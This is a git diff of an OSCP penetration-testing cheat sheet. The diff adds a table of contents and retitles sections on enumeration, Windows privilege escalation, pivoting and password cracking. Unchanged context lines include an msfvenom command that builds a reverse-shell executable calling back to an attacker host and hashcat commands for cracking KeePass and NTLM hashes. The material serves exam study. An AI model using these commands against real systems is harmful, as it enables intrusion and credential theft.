@@ -2,6 +2,41 @@
 
 Passed the 2023 version of the OSCP, these commands were gathered throughout practicing for the exam.
 
+- [OSCP Commands Cheat Sheet](#oscp-commands-cheat-sheet)
+  * [Nmap Scans and Inital Enumeration](#nmap-scans-and-inital-enumeration)
+    + [Regular scans to do on every system:](#regular-scans-to-do-on-every-system)
+    + [**Enum4linux**](#enum4linux)
+    + [LDAP](#ldap)
+    + [Scanning through a Pivot](#scanning-through-a-pivot)
+    + [Scanning for Vulnerabilities](#scanning-for-vulnerabilities)
+- [Windows Commands Reminders and Priv esc](#windows-commands-reminders-and-priv-esc)
+    + [Usefull commands and Enumeration:](#usefull-commands-and-enumeration)
+  * [Initial access reminders](#initial-access-reminders)
+    + [**Connecting to box with creds**](#connecting-to-box-with-creds)
+    + [Switch to user with creds and NO GUI](#switch-to-user-with-creds-and-no-gui)
+    + [Enumerating Service on windows box](#enumerating-service-on-windows-box)
+  * [Windows Priv Esc](#windows-priv-esc)
+    + [Great lil cheat sheet](#great-lil-cheat-sheet)
+- [Active Directory Magic](#active-directory-magic)
+- [SMB](#smb-3)
+- [Setting up Pivot](#setting-up-pivot)
+    + [SSH](#ssh-1)
+    + [Chisel HTTP Tunnel](#chisel-http-tunnel)
+- [Linux Cheat Sheet](#linux-cheat-sheet)
+  * [Low Hanging Fruit](#low-hanging-fruit)
+  * [Checklist](#checklist-1)
+- [SNMP](#snmp-1)
+- [Passowrd attacks](#passowrd-attacks)
+    + [Password attacks](#password-attacks)
+    + [Spraying against winrm](#spraying-against-winrm)
+    + [Craking zip:](#craking-zip)
+    + [Cracking SYSTEM and ntds.dit](#cracking-system-and-ntdsdit)
+    + [Cracking SAM and SYSTEM](#cracking-sam-and-system)
+    + [Cracking keepass (.kdbx)](#cracking-keepass-kdbx)
+    + [**Cracking Hash snagged from SMB auth)**](#cracking-hash-snagged-from-smb-auth)
+- [Web Attack Guide](#web-attack-guide)
+
+
 
 ## Nmap Scans and Inital Enumeration
 
@@ -50,13 +85,13 @@ Very rare but just a common vuln scan:
 
 `nmap -T5 -sU --top-ports 10000 <IP>`
 
-# Windows Commands + Reminders / Priv esc
+# Windows Commands Reminders and Priv esc
 
 msfvenom quick shell:  
 
 `msfvenom -p windows/shell/reverse_tcp LHOST=<hostIP> LPORT=<port> -f exe -o revshell.exe` 
 
-### Usefull commands / Enumeration:
+### Usefull commands and Enumeration:
 
 CMD
 
@@ -1007,11 +1042,11 @@ This will output A LOT OF INFO, `cat`out the text file and `grep` for “STRING�
 If snmp port is open but snmpwalk fails may need to brute force community string. That is shown in the section above of Active Direcrtoy magic. I like this wordlist (https://github.com/danielmiessler/SecLists/blob/master/Discovery/SNMP/common-snmp-community-strings.txt) however that is up to prefrence
 
 
-# Passowrd attacks/N’ Cracking Stuff N’ hashes N’ Stuff
+# Passowrd attacks
 
 ### Password attacks
 
-### AWLAYS CHECK https://crackstation.net/
+AWLAYS CHECK https://crackstation.net/
 
 ### Spraying against winrm
 
@@ -1040,7 +1075,9 @@ and then crack with joh
 
 `ntds.dit` and `SYSTEM` could be any file name in theory, usually just transfer them to my kali with the same exact file name though
 
-### **Cracking SAM and SYSTEM (NTLM)**
+### Cracking SAM and SYSTEM
+
+Here we are cracking an (NTLM) hash
 
 Have SAM and SYSTEM file on kali
 
@@ -1070,7 +1107,9 @@ Crack with hashcat:
 
 `hashcat -m 13400 <filename> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
 
-### **Cracking Hash snagged from SMB auth (NTLM-SSP)**
+### **Cracking Hash snagged from SMB auth**
+
+Here we are cracking a (NTLM-SSP) hash
 
 [Getting Creds via NTLMv2](https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html#cracking-ntlmv2)
 
